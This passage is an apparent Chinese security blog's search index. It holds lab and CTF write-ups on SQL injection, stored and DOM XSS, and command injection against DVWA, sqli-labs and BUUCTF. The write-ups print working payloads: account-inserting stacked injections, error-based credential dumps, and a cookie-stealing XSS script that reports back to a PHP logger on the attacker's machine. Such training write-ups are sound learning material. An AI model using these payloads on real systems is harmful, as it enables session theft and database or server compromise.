最后一行，就是flag了，以文本形式保存下来","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"刷题","slug":"刷题","permalink":"https://qidian-png.github.io/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"SQL注入-堆叠注入","slug":"SQL注入—堆叠注入","date":"2020-09-23T12:39:05.000Z","updated":"2020-09-23T12:42:26.351Z","comments":true,"path":"2020/09/23/SQL注入—堆叠注入/","link":"","permalink":"https://qidian-png.github.io/2020/09/23/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/","excerpt":"","text":"在BUUCTF上做了一道web题，涉及到了堆叠注入，所以就来记录一下。 在SQL语句中，语句的结束都是以；结尾，但是如果我们在；后面再加上一条SQL语句，两条语句会一起执行吗？这也就是造成堆叠注入的原因了 最简单的语句select * from users;DELETE FROM test 先查询user表，然后再从test数据库里删除user表。 下面我们进行实战 靶场:sql-libs38 先判断闭合点,为’ 再构造payload:?id=1’ order by 4 %23 判断出列数为3列 第38关可以理解为盲注，第二条语句的对错不会给我们回显 好，我们先构造payload：?id=-1&#39;; insert into users(id,username,password) values(88,&#39;aaa&#39;,&#39;bbb&#39;)%23 但是呢 页面没有回显，我们去数据库看一下 最后一行，username：aaa,password:bbb已经成功插入进数据库 如果我们添加的是管理员的账号和密码，那又是什么样的结果。 这一关不明显，我们去试试第42关 sql-libs-42 因为刚刚已经插入进去了aaa，现在直接构造payload登录 ①username:aaa&#39;;insert into users(id,username,password) values(60,&#39;root&#39;,&#39;root&#39;)#password:bbb 去查了数据库发现没有添加成功，但是语句没错，考虑对username进行了过滤或者其他防护措施。 ②username:aaapassword:bbb&#39;;insert into users(id,username,password) values(60,&#39;root&#39;,&#39;root&#39;)# 再试试对password进行堆叠 登陆成功 查看数据库 插入成功了 去看了一下42关的源码 12$username &#x3D; mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]); $password &#x3D; $_POST[&quot;login_password&quot;]; 对用户名进行了转义，但是password直接以post方式提交了，这就造成了堆叠注入。 BUUCTF上堆叠注入例题讲解","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://qidian-png.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入-二次注入","slug":"SQL注入—二次注入","date":"2020-09-21T12:06:05.000Z","updated":"2020-09-21T12:11:20.593Z","comments":true,"path":"2020/09/21/SQL注入—二次注入/","link":"","permalink":"https://qidian-png.github.io/2020/09/21/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/","excerpt":"","text":"原理：用户向数据库里存入恶意的数据，在数据被插入到数据库之前，肯定会对数据库进行转义处理，但用户输入的数据的内容肯定是一点摸样也不会变的存进数据库里，而一般都默认为数据库里的信息都是安全的，查询的时候不会进行处理，所以当用户的恶意数据被web程序调用的时候就有可能出发SQL注入。 图解：二次注入比普通的注入更难发现，很难被工具扫描出来。 原理大概知道了，接下来就是实战了 以sql-libs第24关为例 有登录，注册页面 好奇的我就试了一下弱口令登录 啧啧啧，登陆成功了！不过这和本文没有联系，回到正题！ 我们利用注册功能，将我们的数据插入数据库里。登陆试试登录进去，现在我们修改密码我们查看一下我们登录的是admin’#，但是修改的却是admin账号的密码，那为什么admin账号的密码会被改变呢？？？ 我们去靶场源文件pass_chang.php看一下找到这句话 $ sql = “UPDATE users SET PASSWORD=’$ pass’ where username=’$ username’ and password=’$ curr_pass’ “; 我们的用户名被admin&#39;#传入进去，在数据库里#号为注释符然后这句话就变成了 $ sql = “UPDATE users SET PASSWORD=’$ pass’ where username=’admin‘#’ and password=’$ curr_pass’ “; 然后就是 $ sql = “UPDATE users SET PASSWORD=’$ pass’ where username=’admin‘ 从而将用户名为admin的账号的密码修改了 数据库还是对自己太过相信，认为数据库里的数据都是正常的，当从数据库里调用的时候没有经过过滤，这就造成了二次注入。 在源码里找到了mysql_real_escape_string($_POST[&quot;login_user&quot;])；这个函数将我们的输入的数据进行转义 123456789101112mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。下列字符受影响：\\x00\\n\\r\\&#39;&quot;\\x1a如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。 emmmm 再次演示一下攻击 先创建一个list.php 12345678910111213141516171819202122232425&lt;?phpinclude(&quot;..&#x2F;sql-connections&#x2F;sql-connect.php&quot;);error_reporting(0);$sql&#x3D;&quot;SELECT * FROM users ORDER BY id&quot;;$result&#x3D;mysql_query($sql);$num&#x3D;mysql_num_rows($result);for ($i&#x3D;0; $i &lt; $num; ++$i) &#123; $row &#x3D; mysql_fetch_array($result); $username &#x3D; $row[1]; $sql_detail &#x3D; &quot;SELECT * FROM users where username&#x3D;&#39;$username&#39;&quot;; $result_detail&#x3D;mysql_query($sql_detail); $num_detail &#x3D; mysql_num_rows($result_detail); for ($j&#x3D;0; $j &lt; $num_detail; ++$j) &#123; $row_detail &#x3D; mysql_fetch_array($result_detail); echo&lt;&lt;&lt;END &lt;table border&#x3D;&quot;1&quot; style&#x3D;&quot;table-layout:fixed;&quot; width&#x3D;&quot;1000&quot;&gt; &lt;tr&gt; &lt;th&gt;$row_detail[1]&lt;&#x2F;th&gt; &lt;th&gt;$row_detail[2]&lt;&#x2F;th&gt; &lt;&#x2F;tr&gt; &lt;&#x2F;table&gt;END; &#125;&#125;?&gt; 我选择把list.php和sql-connect.php放在一起 现在我们在注册一个用户名1’ union select 1,user(),database()# 然后访问list.php用户名和密码就被打印出来了 我们分析一下流程。 list.php包含了sql-connect.php，我们创建好账号后，再次登录使用1‘ union select 1,user(),database() # $ username = $row[1]; $ sql_detail = “SELECT * FROM users where username=’$ username’”; 我们的username传入进去 $ sql_detail = “SELECT * FROM users where username=’1’ union select1,user(),database() #’”; 也就是语句变成了 $ sql_detail = “SELECT * FROM users where username=union select 1,user(),database() ”; 我们从表里就打印出了账号和密码这张表。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://qidian-png.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"XSS攻击实战","slug":"XSS攻击实战","date":"2020-09-20T09:29:05.000Z","updated":"2020-09-20T09:34:58.741Z","comments":true,"path":"2020/09/20/XSS攻击实战/","link":"","permalink":"https://qidian-png.github.io/2020/09/20/XSS%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/","excerpt":"","text":"实验环境：kail虚拟机与本机先来kail里操作一波 ①开启kail的apache服务，开启命令/etc/init.d/apache2 start第一步成功了！ ②进入/var/www/html/里创建新文件cookie.php,命令：sudo touch cookie.php③再用vi进行编辑，命令sudo vi cookie.php 12345678&lt;?php$cookie &#x3D; $_GET[&#39;cookie&#39;];$ip &#x3D; getenv (&#39;REMOTE_ADDR&#39;);$time &#x3D; date(&#39;Y-m-d g:i:s&#39;);$fp &#x3D; fopen(&quot;cookie.txt&quot;,&quot;a&quot;);fwrite($fp,&quot;IP: &quot;.$ip.&quot;Date: &quot;.$time.&quot; Cookie:&quot;.$cookie.&quot;\\n&quot;);fclose($fp);?&gt; 保存的命令:wq找了好久才找到的，保存好之后需要给我们的脚本提权。④我们需要手动创建一个cookie.txt文件并且对他进行修改命令：sudo touch cookie.txt和sudo chmod 777 cookie.txt ⑤使用ps aux | grep apache枚举出apache服务的所属组⑥使用chown www-data:www-data cookie.txt更改一下，确保cookie.txt所有组已经成为了www-data 这步也已经🆗了 ⑦再使用curl 192.168.132.144/cookie.php?cookie=1试一下是否能正确写入数据Good!!! 在本机的DVWA中找到XSS存储型漏洞(等级为low) 我们构造payload：&lt;script&gt;document.write(&#39;&lt;img src=&quot;http://192.168.46.129/cookie.php?cookie=&#39;+document.cookie+&#39;&quot; width=0 height=0 &gt;&#39;)&lt;/script&gt;并提交。 注意将IP改为kail攻击机的IP 由于对提交的评论有字符限制，我们可以修改最大字数限制 随便输入评论，我们这边查看cookie.txt 已经存进来了，至于拿到了cookie怎么用，我已经在前面讲过了","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"XSS学习","slug":"XSS学习","permalink":"https://qidian-png.github.io/tags/XSS%E5%AD%A6%E4%B9%A0/"}]},{"title":"每周刷题(一)","slug":"每周刷题(一)","date":"2020-09-19T05:27:05.000Z","updated":"2020-09-20T09:36:23.965Z","comments":true,"path":"2020/09/19/每周刷题(一)/","link":"","permalink":"https://qidian-png.github.io/2020/09/19/%E6%AF%8F%E5%91%A8%E5%88%B7%E9%A2%98(%E4%B8%80)/","excerpt":"","text":"题目来源：BUUCTF@TOC 0×00 [HCTF 2018]WarmUp打开题目给了个链接：http://9b596859-35ea-451c-b4a9-8499102976f2.node3.buuoj.cn/ 打开链接是张滑稽图片，查看源码 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt; &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt; &lt;title&gt;Document&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt; &lt;!--source.php--&gt; &lt;br&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg&quot; &#x2F;&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 发现了source.php 进入source.php找到源代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#39;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page &#x3D; mb_substr( $page, 0, mb_strpos($page . &#39;?&#39;, &#39;?&#39;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page &#x3D; urldecode($page); $_page &#x3D; mb_substr( $_page, 0, mb_strpos($_page . &#39;?&#39;, &#39;?&#39;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#39;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#39;file&#39;]) &amp;&amp; is_string($_REQUEST[&#39;file&#39;]) &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;]) ) &#123; include $_REQUEST[&#39;file&#39;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src&#x3D;\\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\\&quot; &#x2F;&gt;&quot;; &#125; ?&gt; 代码开头找到了hint.phpflag不在这。 对源码的理解： 1234567891011121314151617181920212223242526272829白名单里有，source.php和hint.php第一个if语句：判断$page是否为空 或者 $page是否为字符串，是空或者不是字符串返回false，不是空或者为字符串返回为true第二个if语句：判断$page是否在$whitelist,存在返回为true从零开始截取$page，截取长度由?在$page的位置决定（也就是截取?号之前的字符串）第三个if语句;截取之后再次判断$page是否存在$whitelist数组中，存在返回为true并且对$page进行url解码再次对$page截取截取之后再次判断$page是否存在$whitelist,存在返回为true第四个if语句：file需要满足三个条件：1.不能为空2.是字符串3.还要通过check file()函数的检查满足就可以进一步找到包含flag的文件不满足打印滑稽表情 flag不在hint.php里，那么应该在source.php里，而且还要确保$page的参数在$whitelist里，？截取之后的$page还在$whitelist里；服务器端提取参数时会对?进行url解码，check file()里会对?再一次进行url解码，所以我们需要对？进行二次编码。 十六进制 123456+ %20 &#x2F; %2F ? %3F % %25 # %23 &amp; %26 所以，我们构造payload：?file=source.php%253f/../../../../../ffffllllaaaagggg满足四个条件。也可以是?file=source.php?/../../../../../ffffllllaaaagggg四个if语句满足其一也行。 之所以使用/../../../../../是因为目录穿越是通过使用 ../ 等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。 0×01 [极客大挑战 2019]EasySQL先判断闭合点，1&#39;报错了说明闭合点就是&#39; 下面判断列数，构造payload：?username=1&amp;password=1&#39; oerder by 1 %23因为是get方式，所以我们需要将注释符#经过url编码%23 判断出列数为3，再次构造payload：?username=1&amp;password=1&#39; union select 1,2,(database()) %23直接得到flag 看大佬的博客，直接一句话：直接 username 永真 就过了 1’ or 1=1 #这操作我吐了。 0×02 [极客大挑战 2019]HardSQL嗯哼 测试了一下，闭合符号还是&#39; 依旧是username=1&amp;password=1&#39; order by 5 %23 这就尴尬了，思路全无………. 看了大佬wp,并学习了报错注入的我回来了 构造payload：?username=1&amp;password=1&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))%23 查看数据库 出来了geek!!! 再次构造payload：?username=1&amp;password=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23 不得不说这个payload真的是难搞，搞了n次 表名也出来了 再次构造payload：?username=1&amp;password=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))%23 得到了用户名，密码字段再次构造payload：?username=1&amp;password=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(username,0x7e,password))from(H4rDsq1)),0x7e),1))%23 得到了一半的flag，然后利用right！构造payload：?username=1 &amp;password=1&#39;or(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e),1))%23前面和后面的对照一下，删除一些字符，拼接就能得到flag！ 这web题真的是费劲！ 0×03 [BJDCTF 2nd]燕言燕语-y1ng打开题目，得到一串数字：79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D200-9，A-F感觉是十六进制，就转换一下得到yanzi ZJQ{xilzv_iqssuhoc_suzjg} 经过维吉尼亚解密，密钥yanzi,得到flag：BJD{yanzi_jiushige_shabi}(别问我为啥是维吉尼亚，我也不知道) 0×04 传统知识+古典密码下载得到附件 我稍微进行了修改一下 emmmXZSDMFLZ打开密码软件，栅栏密码试一下，得到了几栏结果 用前四个结果，再来一次凯撒。 最后找到了SHUANGYU,emmmmm,提交成功了！ 0×05[GKCTF2020]小学生的密码学这也是第一次见这道题，是仿射加密类型的 找个在线解密网站 sorcery 0×06 rar下载附件需要输入纯四位数字的密码 直接打开ARPR进行暴力破解，不一会密码就出来了 就得到了flag。 0×07 文件中的秘密打开是一张图片 直接拉进winhex分析，在winhex里搜索flag。 提交就对了。 0×08 qr里面是一张二维码，扫一下就得到了flag。 0×09 wireshark 是一张流量表在这里找到登录信息双击找密码 提交flag就对了！！！","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"刷题","slug":"刷题","permalink":"https://qidian-png.github.io/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"命令执行—代码执行漏洞分析与实战","slug":"命令执行—代码执行漏洞分析与实战","date":"2020-09-13T08:09:05.000Z","updated":"2020-09-21T12:09:12.401Z","comments":true,"path":"2020/09/13/命令执行—代码执行漏洞分析与实战/","link":"","permalink":"https://qidian-png.github.io/2020/09/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E2%80%94%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E6%88%98/","excerpt":"","text":"@TOC 命令执行漏洞定义：服务器端没有对用户提交的命令进行严格的过滤，而当用户可以控制命令执行函数里的参数时，便可以将恶意系统命令当成正常系统命令执行，从而形成系统攻击。 漏洞危害： 继承Web服务程序的权限去执行系统命令或读写文件反弹shell控制整个网站甚至控制服务器进一步内网渗透 PHP中的危险函数： 12345678system：成功则返回命令输出的最后一行，失败则返回FALSE。exec：命令执行结果的最后一行内容。shell_exec：命令执行的输出。如果执行过程中发生错误或者进程不产生输出，则返回NULL。passthru：执行外部程序并且显示原始输出。eval：将输入的字符串参数当做PHP程序代码来执行。assert：assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动preg_replace：preg_replace 函数执行一个正则表达式的搜索和替换。call_user_func ：call_user_func — 把第一个参数作为回调函数调用 ①eval()函数定义和用法：eval() 函数把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。 语法 12eval(phpcode)phpcode 必需。规定要计算的 PHP 代码。 ②assert()函数 定义和用法：检查一个断言是否为 FALSE 语法 PHP 5bool assert ( mixed $assertion [, string $description ] )PHP 7bool assert ( mixed $assertion [, Throwable $exception ] )assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动 例子 1234&lt;?php$a &#x3D; $_GET[&#39;a&#39;];assert($a);?&gt; 12http:&#x2F;&#x2F;127.0.0.1&#x2F;oscommand&#x2F;1.php?a&#x3D;phpinfo();http:&#x2F;&#x2F;127.0.0.1&#x2F;oscommand&#x2F;1.php?a&#x3D;phpinfo() eval()函数 VS assert()函数注意：eval()函数正确执行需要满足php的代码规范，而assert()函数则不存在这个问题，对于php的代码规范要求不高 ③preg_replace()函数 定义和语法：preg_replace 函数执行一个正则表达式的搜索和替换。 例子 1234&lt;?php$a &#x3D; $_GET[&#39;a&#39;];echo preg_replace(&quot;&#x2F;test&#x2F;e&quot;, $a, &quot;just test!&quot;)?&gt; 1http:&#x2F;&#x2F;127.0.0.1&#x2F;oscommand&#x2F;1.php?a&#x3D;phpinfo() ps: 在php5.4及以下版本中，preg_replace()可正常执行代码，而在php5.5及后续版本中会提醒”/e”修饰符已被弃用，要求用preg_replace_callback()函数来代替。 ④call_user_func()函数定义和用法：call_user_func — 把第一个参数作为回调函数调用 语法mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $… ]] )第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 例子 123&lt;?phpcall_user_func($_GET[&#39;a&#39;],$_GET[&#39;b&#39;]);?&gt; 1http:&#x2F;&#x2F;127.0.0.1&#x2F;oscommand&#x2F;1.php?a&#x3D;assert&amp;b&#x3D;phpinfo() 看一下命令连接符：在windows和linux都支持，如果程序没有进行过滤，那么我们可以通过连接符来执行多条命令。 command1 &amp;&amp; command2 先执行Command 1，执行成功后执行Command 2，否则不执行Command 2command1 | command2 只执行command2command1 &amp; command2 先执行Command 1，不管是否成功，都会执行Command 2 靶场：DVWA 等级为：low构造payload：#127.0.0.1&amp;&amp;dir我们可以通过dir命令，当前靶场所在的文件目录。 通过#127.0.0.1&amp;ipconfig看到了本机IP 查看源码： 12345678910111213141516171819&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ] ) ) &#123; &#x2F;&#x2F; Get input $target &#x3D; $_REQUEST[ &#39;ip&#39; ]; &#x2F;&#x2F; Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123; &#x2F;&#x2F; Windows $cmd &#x3D; shell_exec( &#39;ping &#39; . $target ); &#125; else &#123; &#x2F;&#x2F; *nix $cmd &#x3D; shell_exec( &#39;ping -c 4 &#39; . $target ); &#125; &#x2F;&#x2F; Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;&#x2F;pre&gt;&quot;;&#125; 看见了php_uname()函数，stristr()函数和shell_exec()函数 12345php_uname — 返回运行 PHP 的系统的有关信息stristr() 函数搜索字符串在另一字符串中的第一次出现,该函数是不区分大小写的。shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。 low等级只是用shell_exec和strietr函数对参数进行处理，没有对我们传入的IP进行严格的过滤。我们就给了我们命令攻击的机会。 等级为：medium我们构造：#127.0.0.1&amp;&amp;dir我们的&amp;&amp;的被过滤掉了新的payload：#127.0.0.1|dir也成功了 换个payload：#127.0.0.1&amp;dir也成功了 看一下源码： 123456789101112131415161718192021222324252627282930&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ] ) ) &#123; &#x2F;&#x2F; Get input $target &#x3D; $_REQUEST[ &#39;ip&#39; ]; &#x2F;&#x2F; Set blacklist $substitutions &#x3D; array( &#39;&amp;&amp;&#39; &#x3D;&gt; &#39;&#39;, &#39;;&#39; &#x3D;&gt; &#39;&#39;, ); &#x2F;&#x2F; Remove any of the charactars in the array (blacklist). $target &#x3D; str_replace( array_keys( $substitutions ), $substitutions, $target ); &#x2F;&#x2F; Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123; &#x2F;&#x2F; Windows $cmd &#x3D; shell_exec( &#39;ping &#39; . $target ); &#125; else &#123; &#x2F;&#x2F; *nix $cmd &#x3D; shell_exec( &#39;ping -c 4 &#39; . $target ); &#125; &#x2F;&#x2F; Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;&#x2F;pre&gt;&quot;;&#125;?&gt; 看到源码里对我们的&amp;&amp;和；进行了过滤；但是我们也可以使用&amp;&amp;&amp;，&amp;和| 等级为：high试了几种payload，只有#127.0.0.1|dir成功了 其他的结果 程序应该把我们用的拼接字符全部都过滤了我们应该用其他的方式绕过。看一下源码： 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ] ) ) &#123; &#x2F;&#x2F; Get input $target &#x3D; trim($_REQUEST[ &#39;ip&#39; ]); &#x2F;&#x2F; Set blacklist $substitutions &#x3D; array( &#39;&amp;&#39; &#x3D;&gt; &#39;&#39;, &#39;;&#39; &#x3D;&gt; &#39;&#39;, &#39;| &#39; &#x3D;&gt; &#39;&#39;, &#39;-&#39; &#x3D;&gt; &#39;&#39;, &#39;$&#39; &#x3D;&gt; &#39;&#39;, &#39;(&#39; &#x3D;&gt; &#39;&#39;, &#39;)&#39; &#x3D;&gt; &#39;&#39;, &#39;&#96;&#39; &#x3D;&gt; &#39;&#39;, &#39;||&#39; &#x3D;&gt; &#39;&#39;, ); &#x2F;&#x2F; Remove any of the charactars in the array (blacklist). $target &#x3D; str_replace( array_keys( $substitutions ), $substitutions, $target ); &#x2F;&#x2F; Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123; &#x2F;&#x2F; Windows $cmd &#x3D; shell_exec( &#39;ping &#39; . $target ); &#125; else &#123; &#x2F;&#x2F; *nix $cmd &#x3D; shell_exec( &#39;ping -c 4 &#39; . $target ); &#125; &#x2F;&#x2F; Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;&#x2F;pre&gt;&quot;;&#125;?&gt; 把我们使用的拼接字符换成了空格，但是它过滤了|没有过滤|这就给了我们机会。 看了一下黑名单好像只有||它的旁边可以加个空格才可以绕过注意：#127.0.0.1|可以拼接很多的DOS命令，什么注册表啊，事件查看器啊等等DOS命令，细思极恐！ 代码执行漏洞靶场：DoraBox 代码执行漏洞的定义：代码执行通常指将可执行代码注入到当前页面中，比如PHP的eval函数，可以将字符串代表的代码作为PHP代码执行，当前用户能够控制这段字符串时，将产生代码执行漏洞。 常见的代码执行相关函数：PHP: eval、assert、preg_replace()、+/e模式（PHP版本&lt;5.5.0） Javascript: eval Python: exec 最简单的利用输入框内：phpinfo() 想上传个一句话木马，结果被发现了由于assert（）函数的检查。试了几个靶场好像上传一句话都不行,就这样吧！！！","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"命令执行","slug":"命令执行","permalink":"https://qidian-png.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"XSS(DOM型)利用与实战","slug":"XSS(DOM型)利用与实战","date":"2020-09-10T08:01:05.000Z","updated":"2020-09-10T08:08:08.029Z","comments":true,"path":"2020/09/10/XSS(DOM型)利用与实战/","link":"","permalink":"https://qidian-png.github.io/2020/09/10/XSS(DOM%E5%9E%8B)%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E6%88%98/","excerpt":"","text":"继续，Go,GO,Go !!! @TOC 等级为：low 1DVWA&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;English default没有经过严格的过滤。 构造payload：DVWA/vulnerabilities/xss_d/?default=English&lt;script&gt;alert(/XSS/)&lt;/script&gt; 成功！ 查看源码： 12345&lt;?php# No protections, anything goes?&gt; 没有任何过滤。 等级为：medium先看源码： 1234567891011121314&lt;?php&#x2F;&#x2F; Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) &#123; $default &#x3D; $_GET[&#39;default&#39;]; # Do not allow script tags if (stripos ($default, &quot;&lt;script&quot;) !&#x3D;&#x3D; false) &#123; header (&quot;location: ?default&#x3D;English&quot;); exit; &#125;&#125;?&gt; 先判断我们传入的函数是否为空，并且经过stripos()函数处理。 stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。 注释：stripos() 函数是不区分大小写的。 1&lt;script&gt;会被查出来，大小写绕过也没用 双写也不行。 只能使用一些其他的标签。 img标签：&lt;img src=1 onerror=alert(&#39;/XSS/&#39;)&gt; 没有弹窗，没有成功。 看了一下 我们的代码插入到了value里，没有插入到option里。 那我们就闭合掉&lt;option&gt;,构造新的payload：DVWA/vulnerabilities/xss_d/?default=English&lt;/option&gt;&lt;img src=1 onerror=alert(&#39;0xdawn&#39;)&gt; 还是不行。 那我们就再闭合&lt;script&gt;,构造新的payload：DVWA/vulnerabilities/xss_d/?default=English&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&#39;0xdawn&#39;)&gt; 弹窗成功了。 等级为：high一顿操作发现不行，看源代码： 1234567891011121314151617181920&lt;?php&#x2F;&#x2F; Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) &#123; # White list the allowable languages switch ($_GET[&#39;default&#39;]) &#123; case &quot;French&quot;: case &quot;English&quot;: case &quot;German&quot;: case &quot;Spanish&quot;: # ok break; default: header (&quot;location: ?default&#x3D;English&quot;); exit; &#125;&#125;?&gt; 先判断我们传入的default是否为空，通过switch语句进行白名单限制。 大佬们用的方法都是应用#号，URL栏的#号之后的内容并不会发送至服务器端，JS应用该符号实现在页面创建加载过程中定向到指定的页面内容上。 构造payload：&lt;script&gt;alert(/XSS/)&lt;script&gt;发现不行。 看了大佬的博客，他的payload：English#&lt;/option&gt;&lt;/select&gt;&lt;BODY ONLOAD=alert(document.cookie)&gt;闭合了&lt;option&gt;和&lt;select&gt;，从而弹窗成功了！(但是触发好像有点问题) 等级为：impossible源码： 12345&lt;?php# Don&#39;t need to do anything, protction handled on the client side?&gt; 啥也没有😑😑😑😑 对我们输入的参数并没有进行URL解码，所以我们输入的任何参数都是经过URL编码，然后直接赋值给option标签。所以，就不存在XSS漏洞了。 页面篡改payload：&lt;script&gt;document.body.innerHTML=&quot;&lt;div style=visibility:visible;&gt;&lt;h1&gt;页面亦被篡改&lt;/h1&gt;&lt;/div&gt;&quot;;&lt;/script&gt; 至此，XSS已经结束了。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"XSS学习","slug":"XSS学习","permalink":"https://qidian-png.github.io/tags/XSS%E5%AD%A6%E4%B9%A0/"}]},{"title":"XSS(存储型)利用与实战","slug":"XSS(存储型)利用和实战","date":"2020-09-09T02:40:05.000Z","updated":"2020-09-10T08:09:29.054Z","comments":true,"path":"2020/09/09/XSS(存储型)利用和实战/","link":"","permalink":"https://qidian-png.github.io/2020/09/09/XSS(%E5%AD%98%E5%82%A8%E5%9E%8B)%E5%88%A9%E7%94%A8%E5%92%8C%E5%AE%9E%E6%88%98/","excerpt":"","text":"接着上篇的继续更！！！ 等级为：low正常填写，emmmmm !!! 构造payload：&lt;script&gt;alert(/XSS/)&lt;/script&gt; 查看源码： 12345678910111213141516171819202122&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123; &#x2F;&#x2F; Get input $message &#x3D; trim( $_POST[ &#39;mtxMessage&#39; ] ); $name &#x3D; trim( $_POST[ &#39;txtName&#39; ] ); &#x2F;&#x2F; Sanitize message input $message &#x3D; stripslashes( $message ); $message &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); &#x2F;&#x2F; Sanitize name input $name &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code 